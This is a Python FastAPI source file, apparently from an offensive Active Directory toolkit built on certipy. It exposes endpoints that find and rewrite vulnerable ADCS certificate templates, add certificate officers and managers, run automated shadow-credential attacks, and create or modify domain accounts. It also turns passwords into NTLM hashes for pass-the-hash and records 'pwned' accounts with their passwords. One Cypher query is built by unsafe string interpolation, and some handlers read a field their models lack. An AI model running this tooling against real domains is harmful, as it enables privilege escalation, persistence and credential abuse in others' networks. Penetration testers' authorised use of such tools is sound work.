def mark_pwned(pwn: Pwned):
        """ Mark an object as pwned """
        obj = pwn.obj
        password = pwn.password
        query = f"""
        MATCH (a) WHERE a.name = '{obj}'
        set a.pwned = 'True'
        set a.password = '{password}'
        return a
        """
        records, summary, keys = client.execute_query(query)
        data = []
        for record in records:
                record = record.data()
                data.append(record)
        data = JSONResponse(data)
        return data

# import hashlib, binascii
from passlib.hash import nthash

def calc_ntlm(passsword) -> str:
        nt = nthash.hash(passsword)
        # h = hashlib.new('md4', passsword.encode('utf-16le')).digest()
        # nt = binascii.hexlify(h).decode()
        return "aad3b435b51404eeaad3b435b51404ee:" + nt
        # p = self.target.password
        # a = ""
        # if self.target.password != "":
        #     a = "aad3b435b51404eeaad3b435b51404ee:" + binascii.hexlify(hashlib.new('md4', p.encode('utf-16le')).digest()).decode()
        # self.target.hashes = a
        # self.target.password = ""
        # print(self.target.__dict__)
        # return self.target



@app.get("/graphing/clear", tags=["Memgraph"])
async def clear_db():
        """
        clear memgraph DB
        """
        query = """
        MATCH(n)
        DETACH DELETE n;
        """
        records, summary, keys = client.execute_query(query)
        return {"response": 0}



@app.get("/routes", tags=['config'])
async def routes():
        """
        returns all routes
        """
        routes = []
        for route in app.routes:
                routes.append(route.path)
        return {"response": routes}


""" ADCS Routes """
from delta2.scripts.adcs.template import Template
from delta2.scripts.adcs.ca import CA 
from certipy.lib.target import Target
from delta2.scripts.adcs.ldap import Connection
from certipy.lib.target import Target as CertipyTarget
from delta2.scripts.adcs.find import Find
from delta2.scripts.adcs.shadow import Shadow
from delta2.scripts.adcs.account import Account

from dns.resolver import Resolver


class Get_Certs(BaseModel):
        dc_ip: str
        domain: str
        username: str
        hashes: str
        password: str
        kdcHost:str = ""
        ns: str
        kerberos: str = "False"
        target_ip: str
        scheme: str = "ldaps"
        vulnerable: str = "False"
        dc_only: str = "False"
        graph: str = "True"

from delta2.scripts.adcs.graph import GraphCerts

@app.post("/adcs/templates/get", tags=['certs'])
def get_templates(certs: Get_Certs):
        """
        Get Templates for ADCS certificates
        """
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        kdc = certs.kdcHost
        target_ip = certs.target_ip
        scheme = certs.scheme
        vulnerable = ast.literal_eval(certs.vulnerable)
        dc_only = ast.literal_eval(certs.dc_only)
        kerberos = ast.literal_eval(certs.kerberos)
        target = CertipyTarget()
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, dc_ip=dc_ip, remote_name=kdc)
        print(target.__dict__)
        connection = Connection(target=target, scheme=scheme)

        find = Find(target=target, connection=connection, json=True, scheme=scheme)
        try:
                if certs.graph == "True":
                        GraphCerts(find=find,database_uri=uri,domain=domain)
                        return {"response": 0}
                data = find.find()
                data = json.loads(data)
                if vulnerable == True:
                        templates = data['Certificate Templates']
                        data = []
                        for template in list(templates.keys()):
                                if "[!] Vulnerabilities" in list(templates[template].keys()):
                                        template = templates[template]
                                        data.append(template)

        except Exception as e:
                print(e, flush=True)
                data = str(e)
        return {"response": data}

class Cert_config(BaseModel):
        dc_ip: str
        domain: str
        username: str
        hashes: str
        password: str
        ns: str
        kerberos: str = "False"
        target_ip: str
        kdcHost: str = ""
        scheme: str = "ldaps"
        template_name:str

@app.post("/adcs/templates/config", tags=['certs'])
def get_config(certs: Cert_config):
        """ 
        Get certificate config
        """
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        template_name = certs.template_name
        scheme = certs.scheme
        kdcHost = certs.kdcHost
        kerberos = ast.literal_eval(certs.kerberos)
        target = CertipyTarget()
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, remote_name=kdcHost)
        connection = Connection(target=target, scheme=scheme)
        template = Template(connection=connection)
        try:
                template_conf = template.get_config(template=template_name)
                data = json.loads(template.to_json(config=template_conf['raw_attributes']))
        
        except Exception as e:
                print(e)
                data = str(e)
        return {"response": data}

class Set_Cert_Config(BaseModel):
        dc_ip: str
        domain: str
        username: str
        hashes: str
        password: str
        ns: str
        kerberos: str = "False"
        target_ip: str
        scheme: str = "ldaps"
        kdcHost: str = ""
        template_name:str
        config_data: dict={}
import ldap3

@app.post("/adcs/templates/set", tags=['certs'])
def set_config(certs: Set_Cert_Config):
        """
        set cert config
        """
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        template_name = certs.template_name
        scheme = certs.scheme
        kdchost = certs.kdcHost
        kerberos = ast.literal_eval(certs.kerberos)
        target = CertipyTarget()
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, remote_name=kdchost)
        cert_conf = certs.config_data

        connection = Connection(target=target, scheme=scheme)
        template = Template(connection=connection)
        cert_conf = template.load_json(json.dumps(cert_conf))
        try:
                template_conf = template.set_config(config=cert_conf, template_name=template_name)
                data = "Set template config!"
                if template_conf == False:
                        raise Exception(ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS)
        except Exception as e:
                data = str(e)
        return {"response": data}

class Cert_enable_disable(BaseModel):
        dc_ip: str
        domain: str
        username: str
        hashes: str
        password: str
        ns: str
        kerberos: str = "False"
        target_ip: str
        scheme: str = "ldaps"
        kdcHost: str = ""
        template_name:str
        certificate_authority: str

@app.post("/adcs/templates/enable", tags=["certs"])
def enable_template(certs: Cert_enable_disable):
        """
        enable a template
        """
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        template_name = certs.template_name
        scheme = certs.scheme
        kerberos = ast.literal_eval(certs.kerberos)
        target = CertipyTarget()
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, remote_name=certs.kdcHost)
        authority = certs.certificate_authority
        try:
                connection = Connection(target=target, scheme=scheme)
                ca = CA(target=target, connection=connection, ca=authority, template=template_name)
                ca.enable(disable=False)
                data = f"enabled: {template_name} on Certificate Authority: {authority}"
        except Exception as e:
                data = str(e)
        return {"response": data}



@app.post("/adcs/templates/disable", tags=["certs"])
def disable_template(certs: Cert_enable_disable):
        """
        disable a template
        """
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        template_name = certs.template_name
        scheme = certs.scheme
        kerberos = ast.literal_eval(certs.kerberos)
        target = CertipyTarget()
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, remote_name=certs.kdcHost)
        authority = certs.certificate_authority
        try:
                connection = Connection(target=target, scheme=scheme)
                ca = CA(target=target, connection=connection, ca=authority, template=template_name)
                ca.enable(disable=True)
                data = f"enabled: {template_name} on Certificate Authority: {authority}"
        except Exception as e:
                data = str(e)
        return {"response": data}
class Cert_officer(BaseModel):
        dc_ip: str
        domain: str
        username: str
        hashes: str
        password: str
        ns: str
        kerberos: str = "False"
        target_ip: str
        scheme: str = "ldaps"
        kdcHost: str = ""
        officer_name:str
        certificate_authority: str

@app.post("/adcs/officers/add", tags=["certs"])
def add_officer(certs: Cert_officer):
        """
        add an officer to domain
        """
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        template_name = certs.template_name
        scheme = certs.scheme
        kerberos = ast.literal_eval(certs.kerberos)
        target = CertipyTarget()
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, remote_name=certs.kdcHost)
        authority = certs.certificate_authority
        officer = certs.officer_name
        try:
                connection = Connection(target=target, scheme=scheme)
                ca = CA(target=target, connection=connection, ca=authority)
                data = ca.add_officer(officer=officer)
        except Exception as e:
                print(e)
                data = str(e)
        return {"response": data}

@app.post("/adcs/officers/delete", tags=["certs"])
def delete_officer(certs: Cert_officer):
        """
        delete a certificate officer
        """
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        template_name = certs.template_name
        scheme = certs.scheme
        kerberos = ast.literal_eval(certs.kerberos)
        target = CertipyTarget()
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, remote_name=certs.kdcHost)
        authority = certs.certificate_authority
        officer = certs.officer_name
        try:
                connection = Connection(target=target, scheme=scheme)
                ca = CA(target=target, connection=connection, ca=authority)
                data = ca.remove_officer(officer=officer)
        except Exception as e:
                print(e)
                data = str(e)
        return {"response": data}

class Cert_manager(BaseModel):
        dc_ip: str
        domain: str
        username: str
        hashes: str
        password: str
        ns: str
        kerberos: str = "False"
        target_ip: str
        scheme: str = "ldaps"
        kdcHost: str = ""
        manager_name:str
        certificate_authority: str
@app.post("/adcs/managers/add", tags=["certs"])
def add_manager(certs: Cert_manager):
        """
        add a certificate manager to domain
        """
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        template_name = certs.template_name
        scheme = certs.scheme
        kerberos = ast.literal_eval(certs.kerberos)
        target = CertipyTarget()
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, remote_name=certs.kdcHost)
        authority = certs.certificate_authority
        manager = certs.manager_name
        try:
                connection = Connection(target=target, scheme=scheme)
                ca = CA(target=target, connection=connection, ca=authority)
                data = ca.add_manager(manager=manager)
        except Exception as e:
                print(e)
                data = str(e)
        return {"response": data}

@app.post("/adcs/managers/delete", tags=["certs"])
def delete_manager(certs: Cert_manager):
        """
        delete a certificate manager
        """
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        template_name = certs.template_name
        scheme = certs.scheme
        kerberos = ast.literal_eval(certs.kerberos)
        target = CertipyTarget()
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, remote_name=certs.kdcHost)
        authority = certs.certificate_authority
        manager = certs.manager_name
        try:
                connection = Connection(target=target, scheme=scheme)
                ca = CA(target=target, connection=connection, ca=authority)
                data = ca.remove_manager(manager=manager)
        except Exception as e:
                print(e)
                data = str(e)
        return {"response": data}

class ShadowCerts(BaseModel):
        dc_ip: str
        domain: str
        username: str
        hashes: str
        password: str
        ns: str
        kerberos: str = "False"
        target_ip: str
        scheme: str = "ldaps"
        kdcHost: str = ""
        target_account: str

@app.post("/kerberos/shadow/auto", tags=['kerberos'])
def auto_shadow(certs: ShadowCerts):
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        scheme = certs.scheme
        target_account = certs.target_account
        kerberos = ast.literal_eval(certs.kerberos)
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = CertipyTarget()
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, dc_ip=dc_ip, remote_name=certs.kdcHost)
        connection = Connection(target=target, scheme=scheme)
        try:
                # connection = Connection(target=target, scheme=scheme)
                shadow = Shadow(target=target, connection=connection, account=target_account, scheme=scheme)
                data = shadow.auto()
        except Exception as e:
                print(traceback.format_exc())
                # print(e)
                data = str(e)
        return {"response": data}


class AccountCerts(BaseModel):
        dc_ip: str
        domain: str
        username: str
        hashes: str
        password: str
        ns: str
        kerberos: str = "False"
        target_ip: str
        scheme: str = "ldaps"
        kdcHost: str = ""
        target_account: str
        dns: str = ""
        upn: str = ""
        sam: str = ""
        spns: str = ""
        passw: str = ""
        group: str = ""


@app.post("/ldap/account/create", tags=['ldap'])
def create_account(certs: AccountCerts):
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        scheme = certs.scheme
        target_account = certs.target_account
        kerberos = ast.literal_eval(certs.kerberos)
        dns = certs.dns
        upn = certs.upn
        sam = certs.sam
        spns = certs.spns
        passw = certs.passw
        group = certs.group
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = CertipyTarget()
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, dc_ip=dc_ip, remote_name=certs.kdcHost)
        connection = Connection(target=target, scheme=scheme)
        try:
                account = Account(target=target, connection=connection, target_user=target_account, dns=dns, upn=upn, sam=sam, spns=spns, passw=passw, group=group, scheme=scheme)
                data = account.create()
        except Exception as e:
                print(traceback.format_exc())
                data = str(e)
        return {"response": data}

@app.post("/ldap/account/delete", tags=['ldap'])
def delete_account(certs: AccountCerts):
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        scheme = certs.scheme
        target_account = certs.target_account
        kerberos = ast.literal_eval(certs.kerberos)
        dns = certs.dns
        upn = certs.upn
        sam = certs.sam
        spns = certs.spns
        passw = certs.passw
        group = certs.group
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = CertipyTarget()
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, dc_ip=dc_ip, remote_name=certs.kdcHost)
        connection = Connection(target=target, scheme=scheme)
        try:
                account = Account(target=target, connection=connection, target_user=target_account, dns=dns, upn=upn, sam=sam, spns=spns, passw=passw, group=group, scheme=scheme)
                data = account.delete()
        except Exception as e:
                print(traceback.format_exc())
                data = str(e)
        return {"response": data}
@app.post("/ldap/account/modify", tags=['ldap'])
def modify_account(certs: AccountCerts):
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        scheme = certs.scheme
        target_account = certs.target_account
        kerberos = ast.literal_eval(certs.kerberos)
        dns = certs.dns
        upn = certs.upn
        sam = certs.sam
        spns = certs.spns
        passw = certs.passw
        group = certs.group
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = CertipyTarget()
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, dc_ip=dc_ip, remote_name=certs.kdcHost)
        connection = Connection(target=target, scheme=scheme)
        try:
                account = Account(target=target, connection=connection, target_user=target_account, dns=dns, upn=upn, sam=sam, spns=spns, passw=passw, group=group, scheme=scheme)
                data = account.modify()
        except Exception as e:
                print(traceback.format_exc())
                data = str(e)
        return {"response": data}

@app.post("/ldap/account/get", tags=['ldap'])
def get_account(certs: AccountCerts):
        dc_ip = certs.dc_ip
        domain = certs.domain
        username = certs.username
        hashes = certs.hashes
        password = certs.password
        ns = certs.ns
        target_ip = certs.target_ip
        scheme = certs.scheme
        target_account = certs.target_account
        kerberos = ast.literal_eval(certs.kerberos)
        dns = certs.dns
        upn = certs.upn
        sam = certs.sam
        spns = certs.spns
        passw = certs.passw
        group = certs.group
        if password != "":
                hashes = calc_ntlm(password)
                password = ""
        target = CertipyTarget()
        target = target.create(domain=domain, username=username, password=password, hashes=hashes,do_kerberos=kerberos, target_ip=target_ip, ns=ns, dc_ip=dc_ip, remote_name=certs.kdcHost)
        connection = Connection(target=target, scheme=scheme)
        try:
                account = Account(target=target, connection=connection, target_user=target_account, dns=dns, upn=upn, sam=sam, spns=spns, passw=passw, group=group, scheme=scheme)
                data = account.get()
        except Exception as e:
                print(traceback.format_exc())
                data = str(e)
        return {"response": data}




if __name__ == '__main__':
        from fastapi.middleware.cors import CORSMiddleware
        
        print(art)
        parser = argparse.ArgumentParser()
        parser.add_argument('-uri', help='memgraph host with port', type=str, default='bolt://127.0.0.1:7687',action="store")
        parser.add_argument('-db_name', help='memgraph db name', type=str, default='memgraph',action="store")
        options = parser.parse_args()

        name = options.db_name
        uri = options.uri
        host = '0.0.0.0'
        port = '9000'
        print(f'to configure graphing database location, go to: `http://{host}:{port}/config` if not specified in arguemnts or if you want to switch databases')
        client = config_driver(DB_name=name, DB_uri=uri)

        #app.run(host, port, debug=True)
        app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:9000"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
        uvicorn.run(app, host=host, port=int(port))
